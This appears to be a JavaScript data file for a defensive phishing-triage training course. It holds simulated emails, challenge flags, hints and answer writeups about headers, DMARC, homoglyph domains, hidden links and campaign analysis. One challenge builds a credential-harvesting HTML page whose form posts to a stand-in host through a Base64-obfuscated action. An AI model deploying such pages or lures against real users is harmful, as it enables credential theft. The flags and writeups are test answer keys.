        { type: 'table', head: ['Verdict', 'Typical signs', 'Action'], rows: [['Malicious', 'Lookalike or forged sender, credential link, disguised attachment', 'Block, purge, find who interacted, respond'], ['Spam', 'Unwanted marketing, no attempt to deceive', 'Block sender if needed, thank the reporter'], ['Legitimate', 'Authenticated, expected sender, links to real domains', 'Explain why, thank the reporter'], ['Simulation', 'Your own phishing test', 'Thank them: reporting is the point']] },
        { type: 'task', text: 'Go through all seven messages in the mailbox and decide on a verdict for each before reading on.', hint: 'Use the Headers tab for authentication results and the sender domain, and the Message tab for links and attachments.', check: (log) => new Set(log.filter((e) => e.type === 'open-mail').map((e) => e.index)).size >= 7 },
        { type: 'reveal', title: 'Verdicts for the practice mailbox', body: '- Team lunch: legitimate, internal and authenticated.\n- Invoice 55102: legitimate. Authenticated supplier, a real PDF, a link to the supplier\'s own portal.\n- Password expires today: malicious. Lookalike domain, link to `keep-password.test`, a Reply-To at a free mail service.\n- Quick favour: malicious business email compromise. Forged From, failed DMARC, Reply-To at free mail.\n- Scanned document: malicious. An executable disguised as a PDF from an unknown scanning service.\n- Spring offers: legitimate marketing, sent through a mailing service with aligned DKIM.\n- Updated pay scale: malicious. Punycode homoglyph of larkfield.example.' },
        { type: 'order', question: 'A phishing email with a credential link reached 40 people. Put the response in order.', items: ['Block the sending domain and the link\'s domain', 'Search mail logs for every recipient and purge the message', 'Check proxy logs for anyone who visited the link', 'Reset passwords and sessions for anyone who entered credentials', 'Write up the indicators and tell staff what to look for'], explain: 'Blocking first stops new clicks while you find the people who already interacted. The proxy logs turn "40 recipients" into the handful who actually need their accounts reset.' },
        { type: 'quiz', question: 'Which detail most changes how urgent a credential phishing report is?', options: [
          { text: 'Whether anyone submitted their password on the page', correct: true, why: 'Delivery alone is low impact if nobody interacted. One submitted password means an attacker may already be signing in, and the response moves to account takeover.' },
          { text: 'How professional the email looked', why: 'Polish affects how many people fall for it, but what matters for response is whether anyone did.' },
          { text: 'The time of day it arrived', why: 'Timing can matter for staffing, but not as much as whether credentials were entered.' }
        ] },
        { type: 'note', title: 'A short write up', body: 'Keep it to what someone else needs: what arrived and when, how many received it, who interacted, the indicators (sender, domains, URLs, hashes, sending IPs, all defanged), what you blocked and purged, and what is still open.' }
      ]
    }
  ],
  challenges: [
    {
      id: 'email-origin',
      title: 'Back to the source',
      difficulty: 'easy',
      points: 100,
      skills: ['Received headers', 'reading headers'],
      prepare: ['email-anatomy'],
      brief: 'A supplier says they never sent the "urgent payment update" email that accounts received this morning. The message went through four mail servers before reaching Larkfield. The police contact on the case wants one thing: the address of the computer it was first sent from.',
      goal: 'Find the IP address in the earliest Received header, the one closest to the sender, and submit `HW{address}`.',
      flag: 'jfXrQuZN8mQLQUwcckLAKvRt',
      workspace: () => ({
        type: 'mail',
        messages: [message({
          hops: [
            { from: '[10.8.0.6]', ip: '198.51.100.207', at: time(6, 41, 2) },
            { from: 'smtp-out.cheapmail.test', ip: '192.0.2.31', at: time(6, 41, 4) },
            { from: 'relay2.cheapmail.test', ip: '192.0.2.44', at: time(6, 41, 9) },
            { from: 'filter.mailguard.example', ip: '203.0.113.70', at: time(6, 41, 15) }
          ],
          auth: { spf: 'softfail', dkim: 'none', dmarc: 'fail', dmarcAction: 'none' },
          returnPath: 'accounts@officesupplies-billing.test', from: '"Office Supplies Ltd" <accounts@officesupplies.example>',
          replyTo: 'accounts@officesupplies-billing.test', to: 'accounts@larkfield.example',
          subject: 'Urgent: update to our bank details', sent: time(6, 41, 0), id: '991b.0313@cheapmail.test',
          text: 'Dear customer,\n\nOur bank has changed. Please update our details before paying invoice 55102 and send confirmation to this address.\n\nNew account: 12-34-56 99887766\n\nOffice Supplies Ltd'
        })]
      }),
      hints: ['Open the Headers tab. Received lines are added at the top as the message travels.', 'The earliest hop is the bottom Received line. The address in square brackets is the one the next server saw connecting.', 'Read the bottom Received header: `from [10.8.0.6] ([10.8.0.6] [x.x.x.x])`. The private 10.x address is what the computer called itself; the other one is where it connected from.'],
      writeup: {
        how: 'There are four Received headers. The bottom one was written by `smtp-out.cheapmail.test` when the sender\'s computer connected. That computer named itself `[10.8.0.6]`, a private address that only means something inside its own network, but the server recorded the real connecting address, `198.51.100.207`. The upper hops are just mail servers passing the message along.',
        why: 'Payment diversion fraud like this costs businesses more than almost any other kind of cybercrime, and the originating address is one of the few hard pieces of evidence an email carries. It also shows the message never touched the supplier\'s real mail system, which helps the supplier prove they were not compromised.',
        fix: 'Verify any change of bank details by phone, using a number you already had, never one from the email. Make DMARC failures for supplier domains visible to staff.'
      }
    },
    {
      id: 'email-auth-verdict',
      title: 'Three real, one fake',
      difficulty: 'easy',
      points: 100,
      skills: ['Authentication-Results', 'DMARC', 'Received headers'],
      prepare: ['email-auth'],
      brief: 'Larkfield\'s payroll provider, PayHarbor, sends payslip notifications every month from `payharbor.example`. Four arrived today and they look identical. Three are real. One is not, and it was delivered by a server that has nothing to do with PayHarbor.',
      goal: 'Find the message that fails authentication and submit the IP address of the server that delivered it to Larkfield (the top Received header) as `HW{address}`.',
      flag: '8ExunC54yWR33yGrJfh1',
      workspace: () => {
        const r = random(77);
        const real = (i, minute) => message({
          hops: [{ from: `app-${i}.payharbor.example`, ip: `203.0.113.${10 + i}`, at: time(7, minute, 2) }, { from: 'out.payharbor.example', ip: '203.0.113.5', at: time(7, minute, 3) }],
          auth: { ...PASS, dkimDomain: 'payharbor.example' }, dkim: 'payharbor.example',
          returnPath: 'notify@payharbor.example', from: '"PayHarbor Payroll" <notify@payharbor.example>', to: ['a.khan', 'l.chen', 'j.smith'][i] + '@larkfield.example',
          subject: 'Your March payslip is ready', sent: time(7, minute), id: `ph-${r.int(100000, 999999)}@payharbor.example`,
          text: 'Your payslip for March 2026 is ready.\n\nSign in at https://my.payharbor.example to view it.\n\nPayHarbor Payroll'
        });
        const fake = message({
          hops: [{ from: '[192.168.0.14]', ip: '198.51.100.3', at: time(7, 19, 40) }, { from: 'mail.fastsend.test', ip: '192.0.2.219', at: time(7, 19, 42) }],
          auth: { spf: 'fail', dkim: 'none', dmarc: 'fail', dmarcAction: 'quarantine' },
          returnPath: 'notify@payharbor.example', from: '"PayHarbor Payroll" <notify@payharbor.example>', to: 'm.garcia@larkfield.example',
          subject: 'Your March payslip is ready', sent: time(7, 19, 39), id: `ph-${r.int(100000, 999999)}@payharbor.example`,
          text: 'Your payslip for March 2026 is ready.\n\nSign in at https://my.payharbor.example to view it.\n\nPayHarbor Payroll',
          html: '<p>Your payslip for March 2026 is ready.</p><p>Sign in at <a href="https://my-payharbor.example.session-view.test/login">https://my.payharbor.example</a> to view it.</p><p>PayHarbor Payroll</p>'
        });
        return { type: 'mail', messages: [real(0, 2), real(1, 7), fake, real(2, 31)] };
      },
      hints: ['Compare the Authentication-Results header of all four messages.', 'Three pass SPF, DKIM and DMARC. The fourth fails all three. Then look at the Received header at the very top of that message.', 'The top Received line is written by Larkfield\'s own server. Submit the address in brackets after `from mail.fastsend.test`.'],
      writeup: {
        how: 'All four messages show the same From line, but only three were signed by `payharbor.example` and sent from its servers. The message to m.garcia has `spf=fail`, `dkim=none` and `dmarc=fail`. Its top Received header, written by Larkfield\'s mail server, shows it arrived from `mail.fastsend.test` at `192.0.2.219`. Its HTML link also points to `session-view.test` rather than PayHarbor.',
        why: 'Attackers copy real notification emails exactly, including the From address. Content checks cannot tell them apart. Authentication results can, which is why they are the first thing to check, and why the top Received header is so useful: it was written by your own server and cannot be faked.',
        fix: 'Ask important senders to publish DMARC with `p=reject` so forgeries never arrive, and make sure your own mail system acts on DMARC failures instead of only recording them.'
      }
    },
    {
      id: 'email-lookalike',
      title: 'Spot the difference',
      difficulty: 'medium',
      points: 150,
      skills: ['lookalike domains', 'punycode', 'homoglyphs'],
      prepare: ['email-lookalikes'],
      brief: 'Ten messages arrived claiming to be from Larkfield or its suppliers. Several use lookalike domains of different kinds. One of them uses a domain that looks exactly like `larkfield.example` on screen, letter for letter, and that is the one the CISO wants added to every block list first.',
      goal: 'Find the sender domain that displays identically to `larkfield.example` and submit it in the form it appears in the raw headers, as `HW{domain}`.',
      flag: 'GmO9P5SJS0RM6699RXEMpkN2KSgic/p1v/FK0A==',
      workspace: () => {
        // [display name, address, real Larkfield or supplier?, subject]
        const senders = [
          ['Larkfield Payroll', 'payroll@larkfield.example', true, 'Payroll cut off is Friday'],
          ['Larkfield IT', 'it@larkfie1d.example', false, 'Mailbox storage full'],
          ['Larkfield Security', 'security@larkfield-security.example', false, 'Unusual sign in detected'],
          ['Office Supplies Ltd', 'billing@officesupplies.example', true, 'Invoice 55140'],
          ['Larkfield Facilities', 'facilities@xn--larkfied-dpb.example', false, 'Parking permits'],
          ['Larkfield HR', 'hr@xn--larkfild-h8g.example', false, 'Annual leave balance'],
          ['Larkfield Benefits', 'benefits@larkfield.example.co', false, 'Your new benefits portal'],
          ['Larkfield CEO', 'ceo@larkfeild.example', false, 'Confidential acquisition'],
          ['Larkfield Travel', 'travel@rnail.larkfield.example', true, 'Booking confirmed'],
          ['Larkfield Wellbeing', 'wellbeing@xn--larkield-u9b.example', false, 'Free health check']
        ];
        const messages = senders.map(([name, address, real, subject], i) => {
          const domain = address.split('@')[1];
          return message({
            hops: [{ from: `mail.${domain}`, ip: real ? `203.0.113.${5 + i}` : `198.51.100.${120 + i}`, at: time(9, i * 4, 1) }],
            auth: { ...PASS, dkimDomain: domain }, dkim: domain,
            returnPath: `bounce@${domain}`, from: `"${name}" <${address}>`,
            subject, sent: time(9, i * 4), id: `m${i}.${subject.length}@${domain}`,
            text: `${subject}.

Details are on the intranet.`
          });
        });
        return { type: 'mail', messages };
      },
      hints: ['Many of these are lookalikes, but most have a visible difference if you read carefully: a digit, a swapped letter, an extra word, or an extra ending.', 'A domain that looks exactly the same on screen must use characters from another alphabet. In raw headers, such domains are written in punycode.', 'Look for `xn--` in the From addresses. Three addresses use it. Decode each one with the Punycode option in Tools, and find the one that renders as exactly l, a, r, k, f, i, e, l, d.'],
      writeup: {
        how: 'The visible lookalikes are `larkfie1d` (digit one), `larkfield-security` (extra word), `larkfield.example.co` (extra ending) and `larkfeild` (swapped letters). Three use punycode. `xn--larkfied-dpb` decodes to `larkfiełd` with a Polish ł, and `xn--larkield-u9b.example` to `larkƒield` with a hooked f, both visibly odd in most fonts. `xn--larkfild-h8g.example` decodes to `larkfiеld.example` with a Cyrillic е, which is indistinguishable from a Latin e. (`rnail.larkfield.example` is a real Larkfield subdomain with an unfortunate name, and it passes because it is genuinely Larkfield\'s.)',
        why: 'Homoglyph domains defeat the advice people are usually given, "check the sender address carefully", because there is nothing to see. Only the raw form gives them away. Browsers show punycode in the address bar for mixed script names for the same reason.',
        fix: 'Block or flag mail from `xn--` domains that render like your own or your suppliers\' names, and monitor certificate transparency logs for new certificates on lookalikes of your domain.'
      }
    },
    {
      id: 'email-hidden-link',
      title: 'Read the small print',
      difficulty: 'medium',
      points: 150,
      skills: ['HTML links', 'URL anatomy', 'registered domains'],
      prepare: ['email-links'],
      brief: 'A convincing "shared document" notification has three links in it. Two of them really do go to Larkfield. One goes somewhere else, behind link text and a host name that both mention Larkfield. If anyone typed their password into it, you need the domain to search the proxy logs for.',
      goal: 'Find the link that does not go to Larkfield and submit its registered domain as `HW{domain}`.',
      flag: 'FLYPnY+gZJldn7NakJux9vAitj6u',
      workspace: () => ({
        type: 'mail',
        messages: [message({
          hops: [{ from: '[10.0.0.12]', ip: '192.0.2.61', at: time(10, 12, 4) }, { from: 'smtp.docsend.test', ip: '192.0.2.62', at: time(10, 12, 6) }],
          auth: { ...PASS, dkimDomain: 'docsend.test' }, dkim: 'docsend.test',
          returnPath: 'share@docsend.test', from: '"Larkfield Documents" <share@docsend.test>', to: 'l.chen@larkfield.example',
          subject: 'Helen Ward shared "Q2 restructuring plan" with you', sent: time(10, 12, 3), id: 'sh-7712@docsend.test',
          text: 'Helen Ward shared a document with you.\n\nOpen: https://docs.larkfield.example/d/q2-restructuring\n\nLarkfield Documents',
          html: '<table><tr><td><img src="https://www.larkfield.example/static/logo.png" alt="Larkfield"></td></tr><tr><td><p><b>Helen Ward</b> shared a document with you.</p><p>"Q2 restructuring plan" (PDF, 1.2 MB)</p><p><a href="https://sso.larkfield.example.auth-docview.test/oauth2/authorize?client=docs&amp;login_hint=l.chen%40larkfield.example">Open in Larkfield Docs</a></p><p>Having trouble? Visit the <a href="https://www.larkfield.example/help/docs">help pages</a>.</p><p style="font-size:10px">Manage notifications at <a href="https://www.larkfield.example/settings/notifications">www.larkfield.example/settings</a></p></td></tr></table>'
        })]
      }),
      hints: ['The plain text part and the HTML part of an email can contain different links. Look at the one the reader actually sees in their mail client.', 'For each link, take the host name and read it from the right. Which one does not end in `larkfield.example`?', 'The "Open in Larkfield Docs" link has a long host name starting with `sso.larkfield.example`. Keep reading to the end of the host name.'],
      writeup: {
        how: 'The plain text version links to `docs.larkfield.example`, but mail clients show the HTML version, where the main button points to `sso.larkfield.example.auth-docview.test`. Reading the host name from the right gives the top level domain `.test` and the registered domain `auth-docview.test`. The help and settings links genuinely go to `www.larkfield.example`, which makes the message feel more legitimate. The `login_hint` parameter pre-fills the victim\'s address on the fake sign in page.',
        why: 'Mixing real links with one malicious one is common: it helps with spam filters, and anyone who hovers over one or two links sees genuine addresses. Analysts need to check every link, and the HTML part, not just the text part.',
        fix: 'Search proxy logs for `auth-docview.test` to find anyone who clicked, block the domain, and reset credentials for anyone who submitted them. Phishing resistant MFA, such as security keys, stops a stolen password from being enough.'
      }
    },
    {
      id: 'email-attachment-html',
      title: 'Not really a PDF',
      difficulty: 'medium',
      points: 200,
      skills: ['attachments', 'file signatures', 'Base64', 'HTML attachments'],
      prepare: ['email-attachments', 'email-links'],
      brief: 'An email with a "remittance advice" attachment was reported by the finance team. The attachment claims to be a PDF. Opening it on a workstation is out of the question, but you still need to know where it would send anyone who did open it.',
      goal: 'Examine the attachment without opening it, find the address its form would send data to, and submit that host\'s registered domain as `HW{domain}`.',
      flag: 'sjeOJDodMv1K5zfot/YMyGhL8Sm5nzsf',
      workspace: () => {
        const action = toBase64(utf8('https://remit-portal.payfiles-secure.test/collect.php'));
        const page = `<!doctype html>\n<html><head><meta charset="utf-8"><title>Remittance Advice - Document Viewer</title></head>\n<body style="font-family:Arial">\n<h3>Larkfield Document Viewer</h3>\n<p>This document is protected. Sign in with your work email to view it.</p>\n<form id="f" method="post">\n<input name="email" placeholder="Email address">\n<input name="password" type="password" placeholder="Password">\n<button>View document</button>\n</form>\n<script>\n// viewer config\nvar cfg = { theme: "light", pages: 2, endpoint: "${action}" };\ndocument.getElementById("f").action = atob(cfg.endpoint);\n</script>\n</body></html>\n`;
        return {
          type: 'case',
          tabs: [
            { type: 'mail', title: 'Mailbox', messages: [message({
              hops: [{ from: '[192.168.8.2]', ip: '203.0.113.97', at: time(11, 20, 7) }, { from: 'mail.northfreight.test', ip: '203.0.113.98', at: time(11, 20, 9) }],
              auth: { ...PASS, dkimDomain: 'northfreight.test' }, dkim: 'northfreight.test',
              returnPath: 'ar@northfreight.test', from: '"North Freight Accounts" <ar@northfreight.test>', to: 'accounts@larkfield.example',
              subject: 'Remittance advice for payment 88213', sent: time(11, 20, 6), id: 'ra88213@northfreight.test',
              text: 'Hello,\n\nPlease see the attached remittance advice for our payment 88213.\n\nKind regards,\nAccounts receivable\nNorth Freight',
              attachments: [{ name: 'Remittance_88213.pdf', type: 'application/pdf', bytes: utf8(page) }]
            })] },
            { type: 'tools', title: 'Tools', op: 'b64d' }
          ]
        };
      },
      hints: ['Expand the attachment. Does "Actual content" agree with the name?', 'It is an HTML page. Use "View contents as text" to read it. The form does not have an action written in plain sight; the script sets it.', 'Copy the `endpoint` value into the Tools tab and Base64 decode it. Then find the registered domain of the host.'],
      writeup: {
        how: 'The attachment is declared as `application/pdf`, but its content starts with `<!doctype html>`: it is a web page. Opened, it would show a fake sign in form in the browser. The form has no visible destination. A short script sets it from a Base64 string, `cfg.endpoint`, which decodes to `https://remit-portal.payfiles-secure.test/collect.php`. The registered domain is `payfiles-secure.test`.',
        why: 'HTML attachments are popular because the fake login page opens from the local disk, so web filters never see a page being fetched, and encoding the destination keeps it away from simple scanners. Recognising the real file type and decoding small obfuscations by hand is a core triage skill.',
        fix: 'Block or strip HTML attachments at the mail gateway unless there is a business need, block the collection domain, and search for other recipients of the same attachment hash.'
      }
    },
    {
      id: 'email-hash-lookup',
      title: 'Known bad',
      difficulty: 'medium',
      points: 200,
      skills: ['SHA-256', 'threat intelligence', 'attachments'],
      prepare: ['email-attachments'],
      brief: 'The threat intelligence team sent this morning\'s list of known malicious attachment hashes to the SOC mailbox. Since then, five messages with attachments have been reported by staff. Most are harmless. Check each attachment against the list.',
      goal: 'Find the reported attachment whose SHA-256 is on the intelligence list. Submit the malware family name from the list and the attachment\'s file name as `HW{family_filename}`.',
      flag: '3IHk7f8MPWee+7QyLPd9y5t8UdF+PQWhe4oQPh1j83Y=',
      workspace: () => {
        const files = [
          ['Timesheet_March.xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fakeZip('xl/workbook.xml', 11)],
          ['Delivery_Note_4471.zip', 'application/zip', fakeZip('Delivery_Note_4471.js', 12)],
          ['brochure.pdf', 'application/pdf', fakePdf('Spring brochure', 'Marketing', 13)],
          ['Statement_0313.zip', 'application/zip', fakeZip('Statement_0313.lnk', 14)],
          ['photo_team_day.jpg', 'image/jpeg', Uint8Array.from([0xff, 0xd8, 0xff, 0xe0, 0, 16, 0x4a, 0x46, 0x49, 0x46, 0, 1, ...new Uint8Array(300)])]
        ];
        const bad = sha256(files[3][2]);
        const decoys = ['GlassMoth', 'Tallowcat', 'Brinewire', 'Quietlark', 'Hollowpine', 'Redfern'];
        const r = random(256);
        const fakeHash = () => Array.from({ length: 64 }, () => '0123456789abcdef'[r.int(0, 15)]).join('');
        const rows = decoys.map((name) => [fakeHash(), name]);
        rows.splice(3, 0, [bad, 'Pinchbeck']);
        const intel = message({
          hops: [{ from: 'mail01.larkfield.example', ip: '10.0.2.10', at: time(7, 30, 1) }],
          auth: { ...PASS, dkimDomain: 'larkfield.example' }, dkim: 'larkfield.example',
          returnPath: 'cti@larkfield.example', from: '"Threat Intelligence" <cti@larkfield.example>', to: 'soc@larkfield.example',
          subject: 'Daily indicators: malicious attachment hashes', sent: time(7, 30), id: 'cti-0313@larkfield.example',
          text: `Morning all,\n\nHashes seen in phishing against our sector in the last 24 hours. SHA-256, then family.\n\n${rows.map(([h, n]) => `${h}  ${n}`).join('\n')}\n\nCTI team`
        });
        const reported = files.map(([name, type, bytes], i) => message({
          hops: [{ from: `mail.sender${i}.test`, ip: `198.51.100.${40 + i}`, at: time(9 + i, 5, 1) }],
          auth: { ...PASS, dkimDomain: `sender${i}.test` }, dkim: `sender${i}.test`,
          returnPath: `user@sender${i}.test`, from: `"Reported by staff" <user@sender${i}.test>`, to: 'soc@larkfield.example',
          subject: `FW: ${name.split('.')[0].replace(/_/g, ' ')}`, sent: time(9 + i, 5), id: `rep${i}@sender${i}.test`,
          text: 'Forwarded as suspicious.', attachments: [{ name, type, bytes }]
        }));
        return { type: 'mail', messages: [intel, ...reported] };
      },
      hints: ['The first message is the intelligence list. Each of the other messages has one attachment with its SHA-256 shown when you expand it.', 'Compare the first few and last few characters of each attachment hash with the list. A match must be exact across all 64 characters.', 'Only one attachment matches a line on the list. Submit the family name from that line, an underscore, then the full file name.'],
      writeup: {
        how: 'Expanding each attachment shows its SHA-256. Comparing them with the intelligence list finds one exact match: `Statement_0313.zip`, listed as Pinchbeck. Its actual content is a ZIP archive holding `Statement_0313.lnk`, a Windows shortcut, which fits the family\'s known delivery method. The other ZIP holds a `.js` script, which is suspicious on its own merits even though it is not on today\'s list.',
        why: 'Hash matching is fast, precise and safe, which makes it the first check for any attachment. But it only finds files someone has already seen and reported. The `.js` inside the delivery note ZIP shows why hash lookups are a starting point and not a verdict.',
        fix: 'Block the hash at the mail gateway and on endpoints, purge the message from all mailboxes, and treat script and shortcut files inside archives as malicious by policy.'
      }
    },
    {
      id: 'email-campaign',
      title: 'Same campaign, different clothes',
      difficulty: 'hard',
      points: 250,
      skills: ['campaign analysis', 'Received headers', 'URL patterns'],
      prepare: ['email-anatomy', 'email-links', 'email-response'],
      brief: 'Staff reported twelve messages this week. The first one is a confirmed credential phish. Attackers rarely send just one message: they vary the sender, subject and wording to get past filters, but they reuse infrastructure. The response team needs to know how big this campaign is so they can purge every copy.',
      goal: 'Work out which reported messages belong to the same campaign as the first one, counting the first. Submit `HW{count_address}`, where the address is the IP of the server that delivered all of them to Larkfield.',
      flag: 'ob7ZuwizbBRCSk1ErbDLdLqoDw==',
      workspace: () => {
        const r = random(1212);
        const campaignIp = '203.0.113.177';
        const subjects = ['Your mailbox is almost full', 'Voicemail received (0:42)', 'Payroll: confirm your bank details', 'Shared file: Budget 2026.xlsx', 'Security alert: new sign in', 'Your parcel could not be delivered', 'Action needed: verify your account', 'Invoice overdue', 'Team photo from Friday', 'Your password expires soon', 'Benefits enrolment closes today', 'Meeting moved to 3pm'];
        const plan = [
          { c: true, ip: campaignIp, host: 'srv1.mx-cloudrelay.test', path: '/lf/auth/' },
          { c: false, ip: '192.0.2.15', host: 'mail.parcels-now.test', path: '/track/' },
          { c: true, ip: campaignIp, host: 'srv1.mx-cloudrelay.test', path: '/lf/auth/' },
          { c: false, ip: '198.51.100.90', host: 'smtp.officesupplies.example', path: '/invoices/' },
          { c: true, ip: campaignIp, host: 'srv1.mx-cloudrelay.test', path: '/lf/auth/' },
          { c: false, ip: '198.51.100.177', host: 'out.bulk-news.test', path: '/lf/auth/' },
          { c: true, ip: campaignIp, host: 'srv1.mx-cloudrelay.test', path: '/lf/auth/' },
          { c: false, ip: '192.0.2.203', host: 'relay.cheapmail.test', path: '/verify/' },
          { c: true, ip: campaignIp, host: 'srv1.mx-cloudrelay.test', path: '/lf/auth/' },
          { c: false, ip: '203.0.113.17', host: 'mail.payharbor.example', path: '/login' },
          { c: true, ip: campaignIp, host: 'srv1.mx-cloudrelay.test', path: '/lf/auth/' },
          { c: false, ip: '203.0.113.71', host: 'mx.docsend.test', path: '/d/' }
        ];
        const domains = ['account-check.test', 'secure-mailbox.test', 'portal-verify.test', 'session-renew.test', 'id-confirm.test', 'mail-quota.test'];
        const senderDomains = ['notice-mail.test', 'alerts-hub.test', 'it-notify.test', 'service-desk.test', 'msg-center.test', 'office-alerts.test', 'parcels-now.test', 'officesupplies.example', 'bulk-news.test', 'cheapmail.test', 'payharbor.example', 'docsend.test'];
        let ci = 0;
        const messages = plan.map((p, i) => {
          const hour = 8 + (i % 9), minute = r.int(0, 55);
          const sender = p.c ? senderDomains[ci] : senderDomains[6 + Math.floor(i / 2)];
          const link = p.c ? `https://${domains[ci++ % domains.length]}${p.path}${r.int(1000, 9999)}?e=staff` : `https://www.${sender}${p.path}${r.int(1000, 9999)}`;
          return message({
            hops: [{ from: '[10.0.0.5]', ip: `${p.c ? '198.51.100' : '192.0.2'}.${r.int(2, 250)}`, at: time(hour, minute, 1) }, { from: p.host, ip: p.ip, at: time(hour, minute, 4) }],
            auth: { ...PASS, dkimDomain: sender }, dkim: sender,
            returnPath: `no-reply@${sender}`, from: `"${['Larkfield IT', 'Voicemail', 'Payroll', 'File share', 'Security', 'Parcels', 'Accounts', 'Billing', 'Priya', 'IT Desk', 'HR', 'Calendar'][i]}" <no-reply@${sender}>`, to: 'soc@larkfield.example',
            subject: subjects[i], sent: time(hour, minute), id: `r${i}x${r.int(1000, 9999)}@${sender}`,
            html: `<p>${subjects[i]}.</p><p><a href="${link}">Open</a></p>`
          });
        });
        return { type: 'mail', messages };
      },
      hints: ['Senders, subjects and link domains all change between messages. Look for what stays the same.', 'Compare the top Received header of each message, which shows the server that delivered it, and the shape of each link\'s path.', 'The first message was delivered from `203.0.113.177` and its link path starts with `/lf/auth/`. Count every message delivered from that same address. Watch out for a message that copies the link path but came from elsewhere, and one from a similar looking address.'],
      writeup: {
        how: 'Every message has a different sender domain, subject and link domain, so none of those group them. The top Received header, written by Larkfield\'s server, shows six messages delivered by `srv1.mx-cloudrelay.test` at `203.0.113.177`, each with a link path starting `/lf/auth/` and an `e=staff` parameter. One newsletter uses a similar path from a different server and a lookalike address, `198.51.100.177`, which is a coincidence worth ruling out explicitly. Six messages, one shared address.',
        why: 'Campaign analysis turns one report into a complete response. If you only purge the reported message, the other five stay in inboxes. Infrastructure such as sending servers, link paths and kit names is more expensive for attackers to change than wording, so it is what investigators group on.',
        fix: 'Purge every message delivered from that address in the campaign window, block it and the six link domains, and search proxy logs for any clicks on `/lf/auth/` paths.'
      }
    }
  ]
};
